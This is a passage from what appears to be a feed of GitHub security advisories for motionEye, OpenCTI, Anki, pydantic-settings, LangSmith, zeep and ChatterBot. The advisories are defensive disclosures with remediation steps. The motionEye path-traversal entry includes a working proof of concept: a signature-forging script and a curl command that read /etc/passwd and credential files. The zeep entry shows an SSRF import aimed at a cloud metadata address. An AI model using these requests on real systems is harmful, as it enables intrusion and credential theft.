<p>Note that while the ownership changes to <code>motion:motion</code> (instead of <code>root:root</code> in the manual method), the permissions remain <code>644</code>, meaning any local user can still read the file.</p>
</li>
<li><p>Confirm as an unprivileged user:</p>
<pre><code class="language-bash">sudo -u testuser cat /etc/motioneye/motion.conf
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
</li>
</ol>
<p>Both installation methods produce the same vulnerable state, confirming this is the default behavior of the software and not a user misconfiguration.</p>
<h2 id="related-vulnerabilities">Related Vulnerabilities</h2>
<ul>
<li><strong>GHSA-45h7-499j-7ww3:</strong> Password hash accepted as API signing key (CWE-836), which allows the hash exposed by this vulnerability to be used for forging authenticated admin API requests</li>
<li><strong>CVE-2025-60787:</strong> OS command injection via <code>image_file_name</code>, which requires admin authentication. When chained with both this vulnerability and GHSA-45h7-499j-7ww3, enables local privilege escalation to root</li>
</ul>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<ol>
<li><strong>Fix file permissions:</strong> Create <code>motion.conf</code> and <code>camera-*.conf</code> with <code>600</code> permissions (<code>-rw-------</code>), readable only by the motionEye service user (addressed in motionEye 0.44.0b1)</li>
</ol>
<h2 id="timeline">Timeline</h2>
<ul>
<li><strong>2026-03-11:</strong> Vulnerability discovered during security research</li>
<li><strong>2026-03-11:</strong> Vendor notified via GitHub Security Advisory</li>
<li><strong>2026-03-12:</strong> Vendor acknowledged, confirmed fix in motionEye 0.44.0b1</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-rhgp-6wq6-9j67">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-rhgp-6wq6-9j67</a></li>
<li><a href="https://github.com/advisories/GHSA-rhgp-6wq6-9j67">https://github.com/advisories/GHSA-rhgp-6wq6-9j67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhgp-6wq6-9j67</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T17:11:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye has an Arbitrary File Read via Path Traversal in Picture/Movie Preview Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-g9fx-5r4h-pcw3</id>
        <link href="https://github.com/advisories/GHSA-g9fx-5r4h-pcw3"/>
        <updated>2026-06-22T17:10:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>motionEye v0.43.1 (latest stable) is vulnerable to path traversal in the picture and movie API endpoints, like <code>/picture/{id}/preview/{filename}</code>. Neither the API handlers, nor the <code>mediafiles.py</code> functions like <code>get_media_preview()</code> check for <code>..</code> sequences in the filename parameter, except <code>get_media_content()</code> which does. This allows an authenticated user with normal (non-admin) privileges to read arbitrary files from the filesystem as the motionEye process user.</p>
<h3 id="details">Details</h3>
<p>The <code>get_media_content()</code> function properly validates the path:</p>
<pre><code class="language-python"># mediafiles.py ~line 506 — SAFE
def get_media_content(camera_config, path, media_type):
    target_dir = camera_config['target_dir']
    full_path = os.path.join(target_dir, path)

    if '..' in path:        # &lt;-- PATH TRAVERSAL CHECK PRESENT
        return None
    ...
</code></pre>
<p>But <code>get_media_preview()</code> does NOT:</p>
<pre><code class="language-python"># mediafiles.py ~line 910 — VULNERABLE
def get_media_preview(camera_config, path, media_type, ...):
    target_dir = camera_config['target_dir']
    full_path = os.path.join(target_dir, path)
    # &lt;-- NO '..' CHECK
    ...
</code></pre>
<p>Similarly, <code>del_media_content()</code> at line ~865 is also missing the check. This is a classic inconsistent fix pattern.</p>
<p>The exploit requires <code>%2F</code>-encoded slashes (<code>..%2F..%2F</code>) which Tornado's URL router does NOT normalize — it passes the raw <code>../</code> through to <code>os.path.join()</code>.</p>
<h3 id="poc">PoC</h3>
<p><strong>Step 1:</strong> Authenticate as any user (normal or admin).</p>
<p><strong>Step 2:</strong> Compute the request signature. motionEye uses HMAC-style signatures for API authentication. The signature is <code>SHA1("GET:&lt;path&gt;?_username=&lt;user&gt;::&lt;password&gt;")</code>. With the default empty admin password:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""Signature generator for motionEye path traversal PoC"""
import hashlib, re, urllib.parse

_SIGNATURE_REGEX = re.compile(r'[^A-Za-z0-9/?_.=&amp;{}\[\]\":, -]', re.DOTALL)

def compute_signature(method, path, key=''):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&amp;'.join([(q[0] + '=' + q[1]) for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = _SIGNATURE_REGEX.sub('-', path)
    key = _SIGNATURE_REGEX.sub('-', key)
    return hashlib.sha1(('{}:{}:{}:{}'.format(method, path, '', key)).encode('utf-8')).hexdigest().lower()

path = '/picture/1/preview/..%2F..%2F..%2F..%2Fetc%2Fpasswd?_username=admin'
sig = compute_signature('GET', path)
print(f'Signature: {sig}')
print(f'curl --path-as-is -s "http://TARGET:8765/{path}&amp;_signature={sig}"')
</code></pre>
<p><strong>Step 3:</strong> Send the request using <code>curl --path-as-is</code> (the <code>--path-as-is</code> flag is <strong>required</strong> — without it, curl normalizes <code>..%2F</code> and collapses the traversal before sending):</p>
<pre><code class="language-bash"># With default empty admin password, the signature is static:
curl --path-as-is -s "http://localhost:8766/picture/1/preview/..%2F..%2F..%2F..%2Fetc%2Fpasswd?_username=admin&amp;_signature=8b387100a519c617bdd66fe629d14b05e09c6e0c"
</code></pre>
<p><strong>Step 4:</strong> The server returns the contents of <code>/etc/passwd</code>.</p>
<p><strong>Verified output:</strong></p>
<img width="1743" height="410" alt="etc_passwd" src="https://github.com/user-attachments/assets/30ec85f7-4fe7-4d3b-ae23-1d02c3ecad64">

<blockquote>
<p><strong>Note on the signature value:</strong> The signature <code>8b387100a519c617bdd66fe629d14b05e09c6e0c</code> is valid for the default empty admin password. If the admin password has been changed, regenerate the signature using the Python script above with the correct password passed as the <code>key</code> parameter.</p>
</blockquote>
<h3 id="impact">Impact</h3>
<p>An authenticated user (normal or admin) can read arbitrary files from the server, including:</p>
<ul>
<li><code>/etc/passwd</code> — user enumeration</li>
<li><code>/etc/motioneye/motion.conf</code> — admin password hash, surveillance password in plaintext</li>
<li><code>/etc/shadow</code> — password hashes (if running as root, which is default in Docker)</li>
<li>SSH keys, environment variables, and other sensitive configuration files</li>
<li>Surveillance footage from other cameras</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g9fx-5r4h-pcw3">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g9fx-5r4h-pcw3</a></li>
<li><a href="https://github.com/advisories/GHSA-g9fx-5r4h-pcw3">https://github.com/advisories/GHSA-g9fx-5r4h-pcw3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9fx-5r4h-pcw3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T17:10:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pycti] OpenCTI has Semi-Blind SSRF via Unvalidated External URL in Data Ingestion Feature]]></title>
        <id>https://github.com/advisories/GHSA-ffm6-vvph-g5f5</id>
        <link href="https://github.com/advisories/GHSA-ffm6-vvph-g5f5"/>
        <updated>2026-06-22T17:01:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The OpenCTI platform’s data ingestion feature accepts user-supplied URLs without validation and uses the Axios HTTP client with its default configuration (allowAbsoluteUrls: true). This allows attackers to craft requests to arbitrary endpoints, including internal services, because Axios will accept and process absolute URLs.</p>
<p>This results in a semi-blind SSRF, as responses may not be fully visible but can still impact internal systems.</p>
<h3 id="impact">Impact</h3>
<p>OpenCTI’s data ingestion feature can allow an attacker to make the application send HTTP requests to arbitrary internal or external endpoints. This means an attacker could reach internal services that are not exposed publicly, such as Elasticsearch, Redis, or RabbitMQ, and potentially extract sensitive data or manipulate internal components. In cloud environments, the attacker could target metadata services like AWS, Azure, or GCP to obtain credentials and configuration details, which could lead to full compromise of the infrastructure. Even though the SSRF is semi-blind and the attacker may not see the full response, the ability to interact with internal services can enable enumeration, data exfiltration, and in some cases remote code execution if internal APIs expose dangerous functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenCTI-Platform/opencti/security/advisories/GHSA-ffm6-vvph-g5f5">https://github.com/OpenCTI-Platform/opencti/security/advisories/GHSA-ffm6-vvph-g5f5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21887">https://nvd.nist.gov/vuln/detail/CVE-2026-21887</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pycti/PYSEC-2026-118.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pycti/PYSEC-2026-118.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-ffm6-vvph-g5f5">https://github.com/advisories/GHSA-ffm6-vvph-g5f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffm6-vvph-g5f5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T17:01:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pycti] OpenCTI May Bypass Introspection Restriction]]></title>
        <id>https://github.com/advisories/GHSA-4mvw-j8r9-xcgc</id>
        <link href="https://github.com/advisories/GHSA-4mvw-j8r9-xcgc"/>
        <updated>2026-06-22T16:44:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The regex validation used to prevent Introspection queries can be bypassed by removing the extra whitespace, carriage return, and line feed characters from the query.</p>
<h3 id="details">Details</h3>
<p>GraphQL Queries in OpenCTI can be validated using the <code>secureIntrospectionPlugin</code>.</p>
<h3 id="impact">Impact</h3>
<p>Bypassing this restriction allows the attacker to gather a wealth of information about the GraphQL endpoint functionality that can be used to perform actions and/or read data without authorization.  These queries can also be weaponized to conduct a Denial of Service (DoS) attack if sent repeatedly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenCTI-Platform/opencti/security/advisories/GHSA-4mvw-j8r9-xcgc">https://github.com/OpenCTI-Platform/opencti/security/advisories/GHSA-4mvw-j8r9-xcgc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37155">https://nvd.nist.gov/vuln/detail/CVE-2024-37155</a></li>
<li><a href="https://github.com/OpenCTI-Platform/opencti/commit/f87d96918c63b0c3d3ebfbea6c789d48e2f56ad5">https://github.com/OpenCTI-Platform/opencti/commit/f87d96918c63b0c3d3ebfbea6c789d48e2f56ad5</a></li>
<li><a href="https://github.com/OpenCTI-Platform/opencti/blob/6343b82b0b0a5d3ded3b30d08ce282328a556268/opencti-platform/opencti-graphql/src/graphql/graphql.js#L83-L94">https://github.com/OpenCTI-Platform/opencti/blob/6343b82b0b0a5d3ded3b30d08ce282328a556268/opencti-platform/opencti-graphql/src/graphql/graphql.js#L83-L94</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pycti/PYSEC-2024-313.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pycti/PYSEC-2024-313.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4mvw-j8r9-xcgc">https://github.com/advisories/GHSA-4mvw-j8r9-xcgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mvw-j8r9-xcgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T16:43:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aqt] Anki's local HTTP server does not sufficiently validate requests]]></title>
        <id>https://github.com/advisories/GHSA-869j-r97x-hx2g</id>
        <link href="https://github.com/advisories/GHSA-869j-r97x-hx2g"/>
        <updated>2026-06-19T22:10:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Anki launches a local HTTP server to serve media files and web pages for parts of its interface. The server fails to validate requests in the following ways:</p>
<ol>
<li>No sufficient validation of the Origin header.</li>
<li>Some endpoints are vulnerable to path traversal attacks.</li>
</ol>
<p>This allows malicious websites to exfiltrate local files given a known path.</p>
<h2 id="browser-impact">Browser impact</h2>
<p>The severity varies by browser because of Private Network Access (PNA), a newer spec that restricts web pages from making requests to localhost/local network addresses:</p>
<p>Chrome/Chromium (including Edge, Brave): Largely protected, as Chrome has implemented PNA restrictions for several years and now puts local network access behind a permission prompt.
Safari: Hasn't implemented PNA yet, though macOS has some OS-level protections.
Firefox: Most vulnerable — hasn't implemented PNA yet, though it's reportedly planned for Firefox 151.</p>
<h2 id="patches">Patches</h2>
<p>The issue was fixed as of Anki 25.09.3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ankitects/anki/security/advisories/GHSA-869j-r97x-hx2g">https://github.com/ankitects/anki/security/advisories/GHSA-869j-r97x-hx2g</a></li>
<li><a href="https://x.com/taviso/status/2051310678800253318">https://x.com/taviso/status/2051310678800253318</a></li>
<li><a href="https://github.com/advisories/GHSA-869j-r97x-hx2g">https://github.com/advisories/GHSA-869j-r97x-hx2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-869j-r97x-hx2g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T22:10:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-settings] pydantic-settings: NestedSecretsSettingsSource follows symlinks outside secrets_dir, enabling local file read and bypassing secrets_dir_max_size]]></title>
        <id>https://github.com/advisories/GHSA-4xgf-cpjx-pc3j</id>
        <link href="https://github.com/advisories/GHSA-4xgf-cpjx-pc3j"/>
        <updated>2026-06-20T00:50:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>NestedSecretsSettingsSource</code> reads secret values from files in a configured <code>secrets_dir</code>. When <code>secrets_nested_subdir=True</code>, a directory entry inside <code>secrets_dir</code> that is a symbolic link pointing <strong>outside</strong> <code>secrets_dir</code> is followed, so files outside the configured directory are read into settings values. The same code path bypasses the documented <code>secrets_dir_max_size</code> protection. An attacker or lower-privileged component able to influence entries in the configured secrets directory (for example, a writable or shared secrets mount) can turn this into an unintended local file read into settings and can defeat the advertised loading-size cap. This report does not claim network reachability by itself.</p>
<h3 id="details">Details</h3>
<p><code>NestedSecretsSettingsSource</code> performed two passes over <code>secrets_dir</code> using two different, inconsistent directory-traversal implementations:</p>
<ul>
<li>The size check in <code>validate_secrets_path()</code> used <code>Path.glob('**/*')</code>, which does <strong>not</strong> descend into a symbolically-linked directory.</li>
<li>The loader in <code>load_secrets()</code> used <code>glob.iglob(f'{path}/**/*', recursive=True)</code> followed by <code>read_text()</code>, which <strong>does</strong> follow symlinked directories and reads through the link target.</li>
</ul>
<p>Because the two passes disagreed on symlinks, a symlinked directory inside <code>secrets_dir</code> whose target lives elsewhere was invisible to the size accounting (counted as 0 bytes) while still being fully read by the loader. This produces two distinct problems:</p>
<ol>
<li><strong>Out-of-tree read (CWE-22 / CWE-59).</strong> A symlinked directory (or file) inside <code>secrets_dir</code> that resolves outside it is followed, and the external file's contents are loaded into the corresponding settings field.</li>
<li><strong><code>secrets_dir_max_size</code> bypass (CWE-400).</strong> The size check never sees the out-of-tree content, so the documented size cap is neither respected nor able to reject the oversized external file. A related amplification exists for cyclic in-tree symlinks, which <code>glob.iglob(recursive=True)</code> re-traverses, inflating the size accounting and the number of loaded secrets.</li>
</ol>
<h4 id="reproduction">Reproduction</h4>
<p>In a clean Linux container, with a <code>secrets_dir</code> containing a symlink <code>secrets/db -&gt; /path/outside</code> and an <code>outside/passwd</code> file of 512 bytes, while <code>secrets_dir_max_size=100</code>:</p>
<pre><code class="language-python">from pydantic import BaseModel
from pydantic_settings import (
    BaseSettings,
    SettingsConfigDict,
    NestedSecretsSettingsSource,
)


class Db(BaseModel):
    passwd: str | None = None


class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        secrets_dir='secrets',
        secrets_nested_subdir=True,
        secrets_dir_max_size=100,  # outside/passwd is 512 bytes
    )
    db: Db = Db()

    @classmethod
    def settings_customise_sources(
        cls, settings_cls, init_settings, env_settings, dotenv_settings, file_secret_settings
    ):
        return (NestedSecretsSettingsSource(file_secret_settings),)
</code></pre>
<p>On affected versions, <code>Settings().db.passwd</code> is populated with the 512-byte out-of-tree file and <strong>no</strong> <code>SettingsError</code> is raised, even though the file exceeds <code>secrets_dir_max_size</code>.</p>
<h3 id="impact">Impact</h3>
<p>Applications that opt into <code>NestedSecretsSettingsSource</code> with <code>secrets_nested_subdir=True</code> and load secrets from a directory whose entries can be influenced by an attacker or a lower-privileged component (for example, a writable or shared secrets mount, or a secrets directory partially populated from untrusted input) are affected. The impact is:</p>
<ul>
<li><strong>Confidentiality:</strong> files outside the configured <code>secrets_dir</code> can be read into settings values (local file read).</li>
<li><strong>Integrity / availability of the safeguard:</strong> the advertised <code>secrets_dir_max_size</code> cap can be bypassed, and cyclic symlinks can inflate resource usage during loading.</li>
</ul>
<p>The vulnerability requires the ability to place a symbolic link inside the configured secrets directory; it is not remotely reachable on its own. Applications that do not use <code>NestedSecretsSettingsSource</code>, or that point <code>secrets_dir</code> at a directory fully under the application's control, are not affected.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade to <strong>pydantic-settings 2.14.2</strong>, which:</p>
<ul>
<li>walks the secrets directory explicitly and only descends into directories whose resolved path stays within <code>secrets_dir</code>, so symlinked directories pointing outside are never followed;</li>
<li>uses a single, cycle-safe iterator for both the size check and the loader, so the size accounting and the loaded set are always consistent and each real directory is visited at most once;</li>
<li>skips any file whose resolved path escapes <code>secrets_dir</code>, as defense in depth.</li>
</ul>
<p>If upgrading is not immediately possible, ensure the configured <code>secrets_dir</code> is fully owned and controlled by the application (no writable or attacker-influenced entries), or avoid <code>secrets_nested_subdir=True</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-settings/security/advisories/GHSA-4xgf-cpjx-pc3j">https://github.com/pydantic/pydantic-settings/security/advisories/GHSA-4xgf-cpjx-pc3j</a></li>
<li><a href="https://github.com/advisories/GHSA-4xgf-cpjx-pc3j">https://github.com/advisories/GHSA-4xgf-cpjx-pc3j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4xgf-cpjx-pc3j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langsmith] LangSmith SDK TracingMiddleware: Arbitrary server-side file read]]></title>
        <id>https://github.com/advisories/GHSA-f4xh-w4cj-qxq8</id>
        <link href="https://github.com/advisories/GHSA-f4xh-w4cj-qxq8"/>
        <updated>2026-06-19T22:10:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>An attacker who can send an HTTP request to a server running the LangSmith SDK's <code>TracingMiddleware</code> can cause that server to read an arbitrary file from its local filesystem and upload the contents to LangSmith as a trace attachment. Depending on how the distributed trace system is deployed, triggering a read may not require authentication. Retrieving the contents requires read access to the LangSmith workspace the traces are sent to. The net effect is a trust-boundary crossing: a party with workspace trace-read access (for example a low-privilege workspace member, a contractor, or a compromised teammate account) gains the ability to read files from any server running <code>TracingMiddleware</code>, a capability outside that workspace's intended trust boundary.</p>
<h1 id="impact">Impact</h1>
<p>Confidentiality (High): arbitrary read of files accessible to the server process, exposed to anyone with workspace trace-read access.</p>
<h1 id="details">Details</h1>
<p>Two defects combine. A field supplied through a tracing-propagation header was merged into the run without validation, allowing injection of run attributes including attachments (CWE-346). A type check intended to gate filesystem access did not match the type of the decoded input, so the guard never engaged (CWE-843). As a result, an attacker-named file is opened by the server and uploaded as a trace attachment by the background tracing thread (CWE-22).</p>
<h2 id="who-can-exploit-this">Who can exploit this</h2>
<ul>
<li>Anyone reachable by HTTP can trigger the file read. Depending on how the distributed trace system is deployed, triggering may not require authentication.</li>
<li>Retrieving the file contents requires read access to the destination LangSmith workspace. The upload uses the server's own configured API key and workspace, which the attacker cannot redirect, so a zero-access outsider cannot retrieve the result; a workspace member, or anyone who has compromised one, can.</li>
</ul>
<h1 id="remediation">Remediation</h1>
<p>Upgrade the Python SDK to <code>&gt;= 0.8.18</code>.</p>
<h1 id="workarounds">Workarounds</h1>
<p>Until upgrading, do not expose <code>TracingMiddleware</code> to untrusted HTTP traffic, and limit workspace trace-read access to trusted members.</p>
<h1 id="credits">Credits</h1>
<p>First reported by @Ryu7zz.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-f4xh-w4cj-qxq8">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-f4xh-w4cj-qxq8</a></li>
<li><a href="https://github.com/advisories/GHSA-f4xh-w4cj-qxq8">https://github.com/advisories/GHSA-f4xh-w4cj-qxq8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4xh-w4cj-qxq8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T22:10:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeep] Zeep: Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-4cc2-g9w2-fhf6</id>
        <link href="https://github.com/advisories/GHSA-4cc2-g9w2-fhf6"/>
        <updated>2026-06-19T22:10:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When parsing a WSDL or XSD document, python-zeep follows transitive references — xsd:import, xsd:include, wsdl:import, and lxml entity/DTD resolution — and will fetch http/https URLs found in those references. The Settings.forbid_external option, intended to disable this transitive remote fetching, was defined but not wired to any logic from version 4.0.0 through 4.3.2 (a regression introduced when zeep moved off defusedxml in 4.0). As a result, setting <code>forbid_external=True</code> had no effect, and applications that processed untrusted or attacker-influenced WSDL/XSD documents could be coerced into making server-side requests to arbitrary URLs (SSRF).</p>
<h2 id="impact">Impact</h2>
<p>Server-Side Request Forgery (SSRF), CWE-918.</p>
<p>An attacker who can supply or influence the contents of a WSDL/XSD that an application loads with zeep can embed an import/include reference (e.g. <code>&lt;xsd:import schemaLocation="http://169.254.169.254/..."&gt;</code>) pointing at an internal or otherwise sensitive endpoint. When zeep parses the document it transitively fetches that URL using the configured transport, causing the application to issue outbound requests to attacker-chosen destinations. This can be used to reach internal-only services, cloud metadata endpoints, or other hosts not directly reachable by the attacker, and may disclose response timing/behaviour.</p>
<p>Impacted users are those who:</p>
<ul>
<li>load WSDL/XSD documents that are untrusted or whose import targets an attacker can control, and/or</li>
<li>relied on <code>forbid_external=True</code> as a security control — in 4.0.0–4.3.2 that setting silently did nothing, so the protection users believed they had was not in effect.</li>
</ul>
<p>Note the default was (and remains) <code>forbid_external=False</code>, i.e. transitive remote fetching is permitted by default; the security defect is specifically that the opt-out control was non-functional.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in python-zeep 4.3.3. The forbid_external setting is now enforced: when set to True, zeep refuses to transitively fetch http/https resources via <code>xsd:import</code>, <code>xsd:include</code>, <code>wsdl:import</code>, or lxml entity/DTD resolution, raising <code>zeep.exceptions.ExternalReferenceForbidden</code>. The user-supplied entry-point WSDL/schema URL is still loaded.</p>
<p>Affected versions: &gt;= 4.0.0, &lt; 4.3.3.</p>
<p>Upgrade to 4.3.3 (or later) and set forbid_external=True when loading documents from untrusted sources:</p>
<pre><code class="language-python">from zeep import Client, Settings

settings = Settings(forbid_external=True)
client = Client("https://untrusted.example/service?wsdl", settings=settings)
</code></pre>
<h2 id="workarounds">Workarounds</h2>
<p>If you cannot upgrade to 4.3.3:</p>
<ul>
<li>Do not load untrusted WSDL/XSD documents, and avoid loading WSDLs whose import/include targets can be influenced by untrusted input.</li>
<li>Vendor the schema locally: pre-fetch and review the WSDL and all of its imported schemas, then load them from local files (e.g. file:// paths) so no remote fetching occurs at parse
time.</li>
<li>Restrict egress at the network layer: block outbound traffic from the host/process to internal ranges and metadata endpoints (e.g. 169.254.169.254, RFC1918 ranges) so SSRF attempts
cannot reach sensitive targets.</li>
<li>Use a restrictive custom Transport: subclass the zeep transport and reject/allow-list URLs in load() so disallowed hosts are never fetched.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mvantellingen/python-zeep/security/advisories/GHSA-4cc2-g9w2-fhf6">https://github.com/mvantellingen/python-zeep/security/advisories/GHSA-4cc2-g9w2-fhf6</a></li>
<li><a href="https://github.com/mvantellingen/python-zeep/commit/83eb07bc6c84d841329d4f88856fecdba86f753e">https://github.com/mvantellingen/python-zeep/commit/83eb07bc6c84d841329d4f88856fecdba86f753e</a></li>
<li><a href="https://github.com/mvantellingen/python-zeep/releases/tag/4.3.3">https://github.com/mvantellingen/python-zeep/releases/tag/4.3.3</a></li>
<li><a href="https://github.com/advisories/GHSA-4cc2-g9w2-fhf6">https://github.com/advisories/GHSA-4cc2-g9w2-fhf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4cc2-g9w2-fhf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aqt] Anki: User scripts in iframes have access to the internal Anki API]]></title>
        <id>https://github.com/advisories/GHSA-cw6h-ffmh-x6vh</id>
        <link href="https://github.com/advisories/GHSA-cw6h-ffmh-x6vh"/>
        <updated>2026-06-19T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Anki's webview-based pages communicate with the Rust backend using an internal localhost API. Anki implements measures to prevent user scripts run in the reviewer/editor from accessing this API (<a href="https://github.com/ankitects/anki/pull/3925">https://github.com/ankitects/anki/pull/3925</a>) but it inadvertently allows access to scripts included via iframes in the editor. While overall only a limited set of API methods are exposed, some such as <code>getImageForOcclusion</code> can read arbitrary files.</p>
<p><strong>CWE:</strong> CWE-22 (Path Traversal)
<strong>Reporter:</strong> Bankde (Eakasit)</p>
<h2 id="affected-products">Affected Products</h2>
<table>
<thead>
<tr>
<th>Ecosystem</th>
<th>Package</th>
<th>Affected Versions</th>
</tr>
</thead>
<tbody><tr>
<td>PyPI</td>
<td><code>aqt</code></td>
<td><code>&lt;= 25.09.3</code></td>
</tr>
</tbody></table>
<h2 id="impact">Impact</h2>
<p>Any desktop Anki user (Windows, macOS, Linux) who imports an untrusted <code>.apkg</code> and views card with an embedded iframe is vulnerable. No special configuration is required. The attacker can read any file accessible to the Anki process and exfiltrate its contents over the network.</p>
<h2 id="patches">Patches</h2>
<p>A patch is available in 25.09.4</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Do not import <code>.apkg</code> files from untrusted sources.</li>
<li>Inspect <code>.apkg</code> contents (it's a ZIP) for <code>.html</code>/<code>.svg</code> files with <code>&lt;script&gt;</code> tags before importing.</li>
<li>Block unexpected outbound network requests from the Anki process at the firewall level.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li>Vulnerability report: <em>Anki arbitrary file read vulnerability (with exfiltration)</em> — Bankde (Eakasit)</li>
<li>Affected source: <a href="https://github.com/ankitects/anki/blob/5a9b54e9380c66e26391f0827867d2a728107836/qt/aqt/mediasrv.py#L223"><code>qt/aqt/mediasrv.py::_handle_local_file_request</code></a></li>
<li>Related prior CVEs: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29073">CVE-2024-29073</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32484">CVE-2024-32484</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62185">CVE-2025-62185</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62187">CVE-2025-62187</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ankitects/anki/security/advisories/GHSA-cw6h-ffmh-x6vh">https://github.com/ankitects/anki/security/advisories/GHSA-cw6h-ffmh-x6vh</a></li>
<li><a href="https://github.com/advisories/GHSA-cw6h-ffmh-x6vh">https://github.com/advisories/GHSA-cw6h-ffmh-x6vh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cw6h-ffmh-x6vh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ChatterBot] ChatterBot: Symlink-Following Arbitrary Write via UbuntuCorpusTrainer]]></title>
        <id>https://github.com/advisories/GHSA-wvrh-2f4m-924v</id>
        <link href="https://github.com/advisories/GHSA-wvrh-2f4m-924v"/>
        <updated>2026-06-19T22:08:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
